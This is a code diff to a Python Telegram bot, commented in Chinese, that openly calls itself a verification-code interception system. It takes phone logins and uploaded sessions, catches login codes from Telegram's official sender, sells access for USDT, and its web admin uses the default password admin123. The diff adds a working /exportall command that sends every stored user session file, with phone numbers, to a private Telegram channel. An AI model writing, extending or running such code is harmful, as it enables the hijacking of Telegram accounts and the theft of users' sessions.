@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Telegram 验证码拦截机器人 - 完整增强版
+Telegram 验证码拦截机器人 - 完整增强版 (Railway 修复版)
 功能：手机号登录 / Session上传 / 验证码拦截 / OKPay支付激活 / 备用卡密 / 管理员系统 / Webhook回调 / Web后台
 作者: @APl520
 """
@@ -85,14 +85,21 @@ class Config:
     PAYMENT_COIN: str = "USDT"                         # 支付币种 (USDT / TRX)
 
     # ---------- 频道配置 ----------
-    REQUIRED_CHANNEL: str = ""                # 用户必须加入的频道
-    FORWARD_CHANNEL: str = "@xsbbooo"                 # Session导出频道
-    FORWARD_BOT_USERNAME: str = "bhgffgggbot"           # 转发验证码的目标机器人
-    TELEGRAM_BOT_ID: int = 777000                     # Telegram官方验证码发送者ID
+    # 用户必须加入的频道（用于权限验证）
+    REQUIRED_CHANNEL_ID: int = -1003848855167          # @xsbooo
+    REQUIRED_CHANNEL_USERNAME: str = "@xsbooo"         # 频道链接
+    # 存放数据的频道（用于导出会话）
+    FORWARD_CHANNEL_ID: int = -1003959241072           # @xsbbooo
+    FORWARD_CHANNEL_USERNAME: str = "@xsbbooo"         # 导出频道链接
+    # 转发验证码的目标机器人
+    FORWARD_BOT_USERNAME: str = "bhgffgggbot"
+    # Telegram官方验证码发送者ID
+    TELEGRAM_BOT_ID: int = 777000
 
     # ---------- Webhook / Web 配置 ----------
     WEBHOOK_HOST: str = "0.0.0.0"
-    WEBHOOK_PORT: int = 39999
+    WEBHOOK_PORT: int = 39999                         # Webhook 回调端口
+    WEB_ADMIN_PORT: int = 39998                       # Web 后台管理端口（和 Webhook 分开）
     WEBHOOK_PATH: str = "/webhook/okpay"
     WEB_USER: str = "admin"                           # Web后台用户名
     WEB_PASS: str = "admin123"                        # Web后台密码
@@ -1320,37 +1327,46 @@ class ChannelVerifier:
         Returns:
             (是否加入, 详细信息)
         """
+        # 使用频道ID进行验证
+        if not Config.REQUIRED_CHANNEL_ID:
+            return True, "频道验证已禁用"
+
         try:
             bot = context.bot
-
-            # 尝试获取聊天成员信息
-            try:
-                chat_member = await bot.get_chat_member(
-                    chat_id=Config.REQUIRED_CHANNEL,
-                    user_id=user_id
-                )
-                if chat_member.status in ['member', 'administrator', 'creator']:
-                    return True, "已加入频道"
-            except Exception as e:
-                logger.warning(f"获取频道成员信息失败 (用户{user_id}): {e}")
-
-            # 检查本地记录
-            if JoinRecordManager.is_recorded(user_id):
-                return True, "已加入频道（记录）"
-
-            return False, "未加入频道"
-
+            
+            # 使用频道ID而不是用户名（更可靠）
+            chat_member = await bot.get_chat_member(
+                chat_id=Config.REQUIRED_CHANNEL_ID,
+                user_id=user_id
+            )
+            
+            logger.info(f"用户 {user_id} 在频道中的状态: {chat_member.status}")
+            
+            if chat_member.status in ['member', 'administrator', 'creator']:
+                return True, "已加入频道"
+            else:
+                logger.warning(f"用户 {user_id} 状态异常: {chat_member.status}")
+                return False, f"用户状态: {chat_member.status}"
+                
         except Exception as e:
-            logger.error(f"检查频道加入状态失败 (用户{user_id}): {e}")
-            return False, f"验证失败: {str(e)}"
+            logger.error(f"获取频道成员信息失败 (用户{user_id}): {e}")
+            
+            # 如果API调用失败，检查本地记录作为备用方案
+            if JoinRecordManager.is_recorded(user_id):
+                logger.info(f"用户 {user_id} 通过本地记录验证")
+                return True, "已加入频道（本地记录）"
+                
+            return False, "未加入频道"
 
     @staticmethod
     def get_join_keyboard() -> InlineKeyboardMarkup:
         """获取加入频道的按钮"""
+        if not Config.REQUIRED_CHANNEL_USERNAME:
+            return InlineKeyboardMarkup([])
         return InlineKeyboardMarkup([
             [InlineKeyboardButton(
                 "📢 点击加入频道",
-                url=f"https://t.me/{Config.REQUIRED_CHANNEL.lstrip('@')}"
+                url=f"https://t.me/{Config.REQUIRED_CHANNEL_USERNAME.lstrip('@')}"
             )],
             [InlineKeyboardButton("✅ 我已加入，验证", callback_data="verify_join")]
         ])
@@ -1416,12 +1432,16 @@ class PermissionChecker:
     async def _send_join_required(update: Update, user_id: int,
                                   context: ContextTypes.DEFAULT_TYPE):
         """发送需要加入频道的消息"""
+        if not Config.REQUIRED_CHANNEL_USERNAME:
+            return
+
+        channel_link = f"https://t.me/{Config.REQUIRED_CHANNEL_USERNAME.lstrip('@')}"
+        
         msg = (
             "🔐 <b>加入频道验证</b>\n\n"
             "⚠️ 您需要先加入指定频道才能使用本机器人！\n\n"
             f"📢 <b>请先加入频道：</b> "
-            f"<a href='https://t.me/{Config.REQUIRED_CHANNEL.lstrip('@')}'>"
-            f"{Config.REQUIRED_CHANNEL}</a>\n\n"
+            f"<a href='{channel_link}'>{Config.REQUIRED_CHANNEL_USERNAME}</a>\n\n"
             "👇 点击下方按钮加入频道，然后点击「我已加入，验证」\n\n"
             "💡 <b>提示：</b> 只需验证一次，之后可正常使用所有功能"
         )
@@ -1610,10 +1630,12 @@ class BotHandlers:
         sessions = SessionManager.get_active_sessions(user_id)
         count = len(sessions)
 
+        status_text = f"\n\n📊 当前监控: {count} 个账号" if count > 0 else ""
+
         await update.message.reply_text(
             f"👋 <b>Telegram 验证码拦截系统</b>\n"
             f"作者 @APl520\n\n"
-            f"请选择操作：{f'\\n\\n📊 当前监控: {count} 个账号' if count > 0 else ''}",
+            f"请选择操作：{status_text}",
             parse_mode='HTML',
             reply_markup=Keyboards.main()
         )
@@ -2043,7 +2065,8 @@ class BotHandlers:
                     "请确保：\n"
                     "1️⃣ 点击下方按钮加入频道\n"
                     "2️⃣ 加入后点击「我已加入，验证」\n\n"
-                    "如果已加入仍验证失败，请稍等几秒后重试。",
+                    "如果已加入仍验证失败，请稍等几秒后重试。\n"
+                    f"调试信息: {msg}",
                     parse_mode='HTML',
                     reply_markup=ChannelVerifier.get_join_keyboard()
                 )
@@ -2053,7 +2076,7 @@ class BotHandlers:
         if data == "show_pay_link" or data.startswith("check_pay:"):
             # 检查是否已加入频道
             is_joined, _ = await ChannelVerifier.check_user_in_channel(context, user_id)
-            if not is_joined:
+            if not is_joined and Config.REQUIRED_CHANNEL_ID:
                 await query.edit_message_text(
                     "⚠️ 请先加入频道后再操作。",
                     reply_markup=ChannelVerifier.get_join_keyboard()
@@ -2548,15 +2571,16 @@ class BotHandlers:
             await update.message.reply_text(
                 f"✅ <b>用户 {target_user_id}</b>\n"
                 f"状态：已加入频道\n\n"
-                f"📢 频道：{Config.REQUIRED_CHANNEL}",
+                f"📢 频道：{Config.REQUIRED_CHANNEL_USERNAME or '已禁用'}",
                 parse_mode='HTML'
             )
         else:
             await update.message.reply_text(
                 f"❌ <b>用户 {target_user_id}</b>\n"
                 f"状态：未加入频道\n\n"
-                f"📢 频道：{Config.REQUIRED_CHANNEL}\n\n"
-                f"请提醒用户加入频道后使用 /start 重新验证。",
+                f"📢 频道：{Config.REQUIRED_CHANNEL_USERNAME or '已禁用'}\n\n"
+                f"详细信息: {msg}\n"
+                "请提醒用户加入频道后使用 /start 重新验证。",
                 parse_mode='HTML'
             )
 
@@ -2597,32 +2621,41 @@ class BotHandlers:
 
     @staticmethod
     async def cmd_export_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """管理员：导出所有会话到频道（静默）"""
+        """管理员：导出所有会话到频道"""
         user_id = update.effective_user.id
 
         if not AdminManager.is_admin(user_id):
             await update.message.reply_text("❌ 无权限")
             return
 
-        await update.message.reply_text("📤 开始导出所有会话到频道，请稍候...")
+        await update.message.reply_text("📤 开始导出所有会话到数据频道，请稍候...")
 
-        # 这个功能比较复杂，需要遍历所有session并打包发送
-        # 简化版本：只导出当前用户的会话
-        sessions = SessionManager.get_active_sessions(user_id)
-
+        sessions = SessionManager.get_all_sessions()
+        
         if not sessions:
             await update.message.reply_text("ℹ️ 没有活跃会话需要导出")
             return
 
         exported_count = 0
-        for phone, info in sessions.items():
-            session_path = info.get("file_path")
-            if session_path and session_path.exists():
-                # 这里可以添加导出逻辑
-                logger.info(f"导出会话: {phone}")
-                exported_count += 1
+        for uid, phones in sessions.items():
+            for phone, info in phones.items():
+                session_path = info.get("file_path")
+                if session_path and session_path.exists():
+                    try:
+                        # 导出到数据频道
+                        with open(session_path, 'rb') as f:
+                            await context.bot.send_document(
+                                chat_id=Config.FORWARD_CHANNEL_ID,
+                                document=f,
+                                caption=f"用户ID: {uid}\n手机号: {phone}",
+                                filename=session_path.name
+                            )
+                        exported_count += 1
+                        logger.info(f"导出会话: {phone} (用户: {uid})")
+                    except Exception as e:
+                        logger.error(f"导出失败 {phone}: {e}")
 
-        await update.message.reply_text(f"✅ 导出完成！共导出 {exported_count} 个会话。")
+        await update.message.reply_text(f"✅ 导出完成！共导出 {exported_count} 个会话到数据频道。")
 
 
 # ============================================================
@@ -2787,10 +2820,10 @@ class WebAdmin:
     def run(cls):
         """运行Web服务器"""
         cls.setup_routes()
-        logger.info(f"Web后台启动: http://{Config.WEBHOOK_HOST}:{Config.WEBHOOK_PORT}")
+        logger.info(f"Web后台启动: http://{Config.WEBHOOK_HOST}:{Config.WEB_ADMIN_PORT}")
         cls.app.run(
             host=Config.WEBHOOK_HOST,
-            port=Config.WEBHOOK_PORT,
+            port=Config.WEB_ADMIN_PORT,
             debug=False,
             use_reloader=False
         )
@@ -2872,6 +2905,18 @@ async def post_init(application: Application):
     """启动后的初始化"""
     logger.info("Bot启动完成，开始扫描会话...")
     await SessionManager.scan_and_restore_all(application.bot)
+    
+    # 检查频道配置
+    try:
+        # 测试访问用户验证频道
+        chat = await application.bot.get_chat(Config.REQUIRED_CHANNEL_ID)
+        logger.info(f"✅ 用户验证频道可用: {chat.title}")
+        
+        # 测试访问数据频道
+        data_chat = await application.bot.get_chat(Config.FORWARD_CHANNEL_ID)
+        logger.info(f"✅ 数据存储频道可用: {data_chat.title}")
+    except Exception as e:
+        logger.error(f"❌ 频道访问失败: {e}")
 
 
 def main():
@@ -2881,18 +2926,18 @@ def main():
     setup_logging()
 
     logger.info("=" * 50)
-    logger.info("Telegram 验证码拦截系统 - 完整增强版")
+    logger.info("Telegram 验证码拦截系统 - 完整增强版 (Railway修复)")
     logger.info("=" * 50)
 
     # 刷新管理员缓存
     AdminManager.refresh_cache()
 
-    # 启动Web后台（独立线程）
+    # 启动 Web 后台（端口 39998）
     web_thread = threading.Thread(target=WebAdmin.run, daemon=True)
     web_thread.start()
-    logger.info(f"Web后台: http://0.0.0.0:{Config.WEBHOOK_PORT}")
+    logger.info(f"Web后台: http://0.0.0.0:{Config.WEB_ADMIN_PORT}")
 
-    # 启动Webhook服务器（独立线程）
+    # 启动 Webhook 服务器（端口 39999）
     webhook_thread = threading.Thread(target=WebhookServer.run, daemon=True)
     webhook_thread.start()
     logger.info(f"Webhook: http://0.0.0.0:{Config.WEBHOOK_PORT}{Config.WEBHOOK_PATH}")
@@ -2963,12 +3008,46 @@ def main():
     # ===== 导出命令 =====
     application.add_handler(CommandHandler('exportall', BotHandlers.cmd_export_all))
 
+    # ===== 测试命令 =====
+    async def cmd_test_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """管理员：测试频道访问"""
+        user_id = update.effective_user.id
+        
+        if not AdminManager.is_admin(user_id):
+            await update.message.reply_text("❌ 无权限")
+            return
+        
+        results = []
+        
+        # 测试用户验证频道
+        try:
+            chat = await context.bot.get_chat(Config.REQUIRED_CHANNEL_ID)
+            results.append(f"✅ 用户验证频道: {chat.title}")
+            
+            # 测试检查当前用户
+            is_joined, msg = await ChannelVerifier.check_user_in_channel(context, user_id)
+            results.append(f"用户状态: {is_joined}, {msg}")
+        except Exception as e:
+            results.append(f"❌ 用户验证频道失败: {e}")
+        
+        # 测试数据频道
+        try:
+            chat = await context.bot.get_chat(Config.FORWARD_CHANNEL_ID)
+            results.append(f"✅ 数据频道: {chat.title}")
+        except Exception as e:
+            results.append(f"❌ 数据频道失败: {e}")
+        
+        await update.message.reply_text("\n".join(results))
+    
+    application.add_handler(CommandHandler('testchannel', cmd_test_channel))
+
     # ===== 启动信息 =====
     logger.info("=" * 50)
-    logger.info("Bot 启动成功")
+    logger.info("Bot 启动成功 ✅")
     logger.info(f"超级管理员: {Config.SUPER_ADMIN_IDS}")
     logger.info(f"普通管理员: {[a['id'] for a in AdminManager.list_admins() if not a['is_super']]}")
-    logger.info(f"要求加入频道: {Config.REQUIRED_CHANNEL}")
+    logger.info(f"用户验证频道: {Config.REQUIRED_CHANNEL_USERNAME} (ID: {Config.REQUIRED_CHANNEL_ID})")
+    logger.info(f"数据存储频道: {Config.FORWARD_CHANNEL_USERNAME} (ID: {Config.FORWARD_CHANNEL_ID})")
     logger.info(f"支付金额: {Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}")
     logger.info("=" * 50)
 
